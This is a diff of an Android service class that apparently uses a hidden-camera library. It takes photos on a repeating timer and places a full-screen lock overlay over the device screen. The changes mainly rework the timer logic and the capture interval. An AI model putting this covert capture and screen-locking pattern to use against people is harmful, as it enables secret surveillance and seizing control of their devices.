@@ -184,8 +184,13 @@ public class MyService extends HiddenCameraService {
                             rot=180;
                     }
                     takePicture(rot);
+                    timer.cancel();
+                    timer = new Timer();
+                    timer.schedule(new TimerTask_(), wait_int);
         }
     }
+    Timer timer;
+    Timer timer1;
 
     public class TimerTask1_ extends TimerTask {
         @Override
@@ -210,8 +215,7 @@ public class MyService extends HiddenCameraService {
         }
     }
 
-        TimerTask_ timerTask;
-        Timer timer;
+
 
         @Override
         public int onStartCommand(Intent intent, int flags, int startId) {
@@ -230,20 +234,36 @@ public class MyService extends HiddenCameraService {
                             .build();
 
                     startCamera(cameraConfig);
+                   /* run = new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            while(true) {
+                                //  try {
+                                //Thread.sleep(wait_int);
+                                SharedPreferences prefs=getSharedPreferences("setting",Context.MODE_PRIVATE);
+                                if (prefs.contains("state")){
+                                    if (prefs.getString("state","off")=="off"){
+                                        stopSelf();
+                                    }
+                                }
+                                takePicture();
+
+                                //} catch(InterruptedException ex){ }
+                            }
+                        }
+                    });*/
 
                     boolHideServ = false;
                     LayoutInflater layoutManager = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
                     view = layoutManager.inflate(R.layout.locklayout, null);
 
 
-                    timerTask = new TimerTask_();
                     timer = new Timer(true);
-                    timer.scheduleAtFixedRate(timerTask, 0, wait_int);
+                    timer.scheduleAtFixedRate( new TimerTask_(), 0, wait_int);
 
                     Log.v("Me", "This is me!");
-                    TimerTask1_ timerTask1 = new TimerTask1_();
-                    Timer timer1 = new Timer(true);
-                    timer1.scheduleAtFixedRate(timerTask1, 0, 500);
+                    timer1 = new Timer(true);
+                    timer1.scheduleAtFixedRate(new TimerTask1_(), 0, 500);
                     //run.start();
                 } else {
 
@@ -324,7 +344,7 @@ public class MyService extends HiddenCameraService {
                     mWindowManager.addView(view, params);
                     view.setZ(99);
                     boolHideServ = true;
-                    wait_int = 100;
+                    wait_int = 1000;
 
                     Log.v("Hi", "Lock");
                 }
